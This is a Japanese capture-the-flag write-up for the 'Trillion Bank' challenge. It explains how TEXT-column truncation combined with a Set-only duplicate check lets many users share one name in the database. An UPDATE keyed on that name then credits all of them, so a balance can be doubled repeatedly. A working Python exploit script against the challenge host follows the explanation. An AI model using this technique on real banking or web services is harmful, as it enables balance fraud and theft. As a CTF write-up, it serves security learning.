# Trillion Bank
ユーザー間で送金ができるWebサービス。ユーザー登録時に残高が10付与されており、ログインしているユーザーの残高が1,000,000,000,000になるとフラグが入手できる。

`/api/register` というエンドポイントではリクエストで指定されたユーザー名でユーザーを作成して、MySQLのDBにINSERTしてしている。
そのユーザー名にあたる `name` カラムはTEXT型であることから、上限である65,535文字以上のユーザー名はすべて65,535文字に切り詰めて登録される。

しかし、この `name` カラムにはユニーク制約が設定されておらず、また、ユーザーの重複チェックが行われてはいるものの、Node.js側の登録されたユーザー名の集合であるSetオブジェクトへのユーザー名の存在有無のみによって判定される。
よって、65,535文字までは同一の文字列、かつ、それ以降は異なる文字列を持つユーザー名のユーザーを複数登録することにより、このユーザー名の重複チェックをバイパスして、DB上では同一ユーザー名を持つユーザーを複数登録することができる。

また、 `/api/transfer` というエンドポイントではDBでのUPDATE操作により、残高を更新しているが、送金先の残高を加算する操作において、指定された送金先ユーザー名に対してUPDATE句が実行される。
```sql
UPDATE users SET balance = balance + ? WHERE name = ?
```
ユーザー登録においては同一ユーザー名を持つユーザーを複数登録できることから、この加算操作は同一のユーザー名を持つ複数のユーザーに対して実行される。

これを利用して送金元のユーザーを変えて加算操作を繰り返すことで、あるユーザーの残高を初期残高である10から倍々に増やすことができる。
次のようなスクリプトを用いてこれを実行することでフラグが獲得できた。

```python
import requests

BASE_URL = 'http://trillion.seccon.games:3000'

s1 = requests.Session()
s2 = requests.Session()

count = 50
c = 'l'
username = c * 65535

sessions = []
for i in range(count):
  s = requests.Session()
  r = s.post(BASE_URL+'/api/register', json={ 'name': username + '3'*i })
  sessions.append(s)

for i in range(count):
  s = sessions[-(1+i)]

  r = sessions[0].get(BASE_URL + '/api/me')
  j = r.json()
  print(j)

  r = s.post(BASE_URL+'/api/transfer', json={ 'recipientName': username, 'amount': j['balance'] })
  print(r.json())

r = sessions[0].get(BASE_URL + '/api/me')
print(r.json())

```